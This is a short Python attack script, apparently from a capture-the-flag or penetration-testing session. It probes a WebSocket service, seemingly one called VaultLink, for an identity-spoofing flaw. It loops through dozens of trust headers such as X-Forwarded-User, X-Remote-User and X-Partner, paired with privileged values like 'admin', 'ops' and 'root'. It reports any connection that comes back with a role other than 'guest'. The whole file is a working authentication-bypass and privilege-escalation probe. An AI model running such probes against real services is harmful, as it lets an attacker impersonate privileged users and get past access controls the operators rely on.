import time, select, sys
from ws import connect, recv_frame
names=["X-Partner","X-Partner-Id","X-Partner-Name","X-Partner-Identity","X-Partner-Role",
"X-Identity","X-Ident","X-User","X-Username","X-Role","X-Account","X-Tenant","X-Client",
"X-Client-Id","X-Client-Name","X-Subject","X-Principal","X-Owner","X-VaultLink-Partner",
"X-VaultLink-Identity","X-VaultLink-User","X-VaultLink-Role","X-Vaultlink-Partner",
"X-Relay-Partner","X-Relay-Identity","X-Relay-User","X-Actor","X-Auth-User",
"X-Forwarded-User","X-Forwarded-Partner","X-Original-User","X-Remote-User",
"Partner","Partner-Id","Identity","Role","User","Subject","Principal","Account","Actor","Client"]
vals=["ops","admin","operator","operations","root","internal","ops"]
def probe(name,val):
    try:
        s,resp=connect(extra_headers={name:val}); s.setblocking(False)
        out=[]; end=time.time()+0.55
        while time.time()<end:
            r,_,_=select.select([s],[],[],0.08)
            if r:
                try: out.append(recv_frame(s)[1])
                except Exception: out.append(b"EOF"); break
        s.close()
        ready=[x for x in out if isinstance(x,bytes) and x.startswith(b"READY")]
        if ready and ready[0]!=b"READY guest":
            return (name,val,ready)
        if any(x==b"EOF" for x in out):
            return None
    except Exception:
        return None
hits=0
for n in names:
    for v in vals[:3]:
        r=probe(n,v)
        if r:
            print("HIT",r,flush=True); hits+=1
        time.sleep(0.15)
print("done hits",hits)
